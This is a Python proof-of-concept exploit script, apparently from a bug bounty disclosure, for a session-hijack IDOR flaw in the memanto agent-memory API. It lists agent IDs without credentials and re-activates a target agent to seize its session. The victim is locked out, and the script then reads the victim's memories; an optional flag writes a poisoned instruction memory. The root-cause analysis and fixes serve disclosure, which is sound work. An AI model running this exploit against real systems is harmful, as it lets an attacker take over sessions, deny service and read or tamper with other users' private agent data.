#!/usr/bin/env python3
"""
CARD 5 — IDOR: Session Hijack via Re-activation
================================================
Bounty: moorcheh-ai/memanto #1852
Severity: HIGH
Status: CONFIRMED LIVE (tested 2026-09-25)

Attack summary
--------------
The POST /api/v2/agents/{agent_id}/activate endpoint issues a fresh session
token to ANY caller who presents the shared Moorcheh API key (or calls from
loopback without any key).  There is no ownership binding — the agent_id is
the only identifier, and agent IDs are enumerable via GET /api/v2/agents.

Attack steps:
  1. Enumerate agent IDs via GET /api/v2/agents     (no credentials)
  2. Call POST /api/v2/agents/{id}/activate          (API key or loopback)
  3. Receive a brand-new session token for that agent
  4. The victim's existing session is immediately invalidated (401)
  5. Attacker has full read/write on the victim's memories

This is a broken object-level authorization (BOLA/IDOR) flaw.  The session
model has no user/owner concept — whoever calls activate last holds the session.

Demonstrated impact (live test)
--------------------------------
  • Victim activates agent "sec-95d9f6e"      → tok_victim (works)
  • Attacker calls activate same agent          → tok_attacker (works)
  • tok_victim now returns 401                  → victim locked out
  • tok_attacker has full memory access         → hijack complete

Prerequisites
-------------
  pip install requests

Usage
-----
  python card5_idor_session_hijack.py --host http://127.0.0.1:8765

  # Target a specific agent
  python card5_idor_session_hijack.py --host http://127.0.0.1:8765 --agent tom

Root cause file
---------------
  memanto/app/routes/sessions.py  activate_agent()
    — only verifies API key / loopback, no ownership check on agent_id
  memanto/app/services/session_service.py  create_session()
    — issues a new JWT + overwrites the session file unconditionally
"""

import argparse
import sys

import requests


def step(n, msg): print(f"\n[Step {n}] {msg}")
def ok(msg):      print(f"  ✅  {msg}")
def fail(msg):    print(f"  ❌  {msg}"); sys.exit(1)
def info(msg):    print(f"  ℹ️   {msg}")
def warn(msg):    print(f"  ⚠️   {msg}")


def run(host: str, api_key: str, target_agent: str | None, do_write: bool) -> None:
    api = f"{host}/api/v2"
    auth = {"X-Api-Key": api_key} if api_key else {}

    print("=" * 65)
    print("CARD 5 — IDOR: Session Hijack via Re-activation")
    print("=" * 65)

    # ── Step 1: Enumerate agents ──────────────────────────────────────────────
    step(1, "Enumerate all agent IDs (no credentials needed)")
    r = requests.get(f"{api}/agents", timeout=5)
    if r.status_code != 200:
        fail(f"GET /agents returned {r.status_code}")
    agents = r.json().get("agents", [])
    if not agents:
        fail("No agents found")
    ok(f"Found {len(agents)} agent(s):")
    for a in agents:
        print(f"    • {a['agent_id']:30s} status={a['status']}")

    target = target_agent or agents[0]["agent_id"]
    info(f"Targeting: {target!r}")

    # ── Step 2: Activate as victim (simulate legitimate user) ─────────────────
    step(2, "Simulate victim: activate agent and get session token")
    r = requests.post(f"{api}/agents/{target}/activate",
                      headers=auth, timeout=20)
    if r.status_code != 200:
        fail(f"Victim activate failed: {r.status_code}: {r.text[:100]}")
    tok_victim = r.json()["session_token"]
    sess_victim = r.json()["session_id"]
    ok(f"Victim session:  session_id={sess_victim}")
    info(f"Token (first 40): {tok_victim[:40]}...")

    # Verify victim's token works
    r = requests.post(f"{api}/agents/{target}/recall",
                      json={"query": "test", "limit": 3},
                      headers={"X-Session-Token": tok_victim}, timeout=10)
    if r.status_code == 200:
        ok(f"Victim token works — recall returned HTTP 200")
    else:
        warn(f"Victim token already invalid? HTTP {r.status_code}")

    # ── Step 3: Attacker re-activates the same agent ──────────────────────────
    step(3, "Attacker re-activates the same agent (same API key / loopback)")
    r = requests.post(f"{api}/agents/{target}/activate",
                      headers=auth, timeout=20)
    if r.status_code != 200:
        fail(f"Attacker activate failed: {r.status_code}: {r.text[:100]}")
    tok_attacker = r.json()["session_token"]
    sess_attacker = r.json()["session_id"]
    ok(f"Attacker session: session_id={sess_attacker}")
    info(f"Token (first 40): {tok_attacker[:40]}...")

    # Confirm the two tokens are different
    if tok_victim != tok_attacker:
        ok("Tokens are DIFFERENT — new session issued (victim invalidated)")
    else:
        warn("Same token returned — may not be an IDOR on this build")

    # ── Step 4: Verify victim is locked out ───────────────────────────────────
    step(4, "Verify victim's token is now invalidated")
    r = requests.post(f"{api}/agents/{target}/recall",
                      json={"query": "test", "limit": 3},
                      headers={"X-Session-Token": tok_victim}, timeout=10)
    if r.status_code == 401:
        ok(f"Victim token → 401 Unauthorized — VICTIM LOCKED OUT")
    elif r.status_code == 200:
        warn("Victim token still works — both tokens valid simultaneously")
    else:
        info(f"Victim token → HTTP {r.status_code}: {r.text[:100]}")

    # ── Step 5: Attacker reads victim's memories ──────────────────────────────
    step(5, "Attacker reads memories with hijacked session")
    r = requests.post(f"{api}/agents/{target}/recall",
                      json={"query": "secret instruction goal", "limit": 10},
                      headers={"X-Session-Token": tok_attacker}, timeout=10)
    if r.status_code == 200:
        mems = r.json().get("memories", [])
        ok(f"Attacker token → 200 OK — {len(mems)} memories readable")
        for m in mems[:3]:
            print(f"    • [{m.get('type','?')}] {m.get('title','?')[:70]}")
    else:
        fail(f"Attacker recall failed: {r.status_code}: {r.text[:100]}")

    # ── Step 6 (optional): Write with hijacked session ─────────────────────────
    if do_write:
        step(6, "Attacker writes a memory with the hijacked session (--write flag)")
        r = requests.post(
            f"{api}/agents/{target}/remember",
            json={
                "type":       "instruction",
                "title":      "[POC] CARD5 IDOR HIJACK WRITE",
                "content":    (
                    "SECURITY POC: Written via IDOR session hijack. "
                    "The attacker obtained this session by calling activate on "
                    "an agent they do not own. Root cause: no ownership binding."
                ),
                "confidence": 0.9,
            },
            headers={"X-Session-Token": tok_attacker},
            timeout=15,
        )
        if r.status_code in (200, 201):
            ok(f"Attacker write succeeded — memory_id={r.json().get('memory_id','?')[:8]}")
        else:
            info(f"Write: HTTP {r.status_code}: {r.text[:100]}")

    print("\n" + "=" * 65)
    print("CARD 5 — SUMMARY")
    print("=" * 65)
    print(f"""
  Root cause:  activate_agent() in sessions.py issues a new session token
               to ANY caller who supplies the management credential or calls
               from loopback.  There is no ownership check — the agent_id
               is the only secret, and it is publicly enumerable.

  Attack flow:
    1. GET /api/v2/agents                    → enumerate all agent_ids
    2. POST /api/v2/agents/<id>/activate     → steal session (no key needed
                                               from loopback)
    3. Victim's token → 401, attacker has    → full memory access

  Impact:
    • Any agent can be hijacked by anyone on loopback
    • Victim is instantly locked out (DoS)
    • Attacker gets full read/write access to all of victim's memories

  Fix:
    • Bind sessions to a per-user credential (not just the shared API key)
    • OR prevent re-activation while a valid session is live (require the
      current token to invalidate it first — like a "logout before login")
    • OR require the existing session token to be presented for re-activation
""")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Card 5 PoC — IDOR session hijack")
    p.add_argument("--host",    default="http://127.0.0.1:8765")
    p.add_argument("--api-key", default="",
                   help="Moorcheh API key (leave empty to use loopback trust)")
    p.add_argument("--agent",   default=None,
                   help="Target agent_id (default: first found)")
    p.add_argument("--write",   action="store_true",
                   help="Also write a poisoned memory to prove write access")
    args = p.parse_args()
    run(args.host, args.api_key, args.agent, args.write)
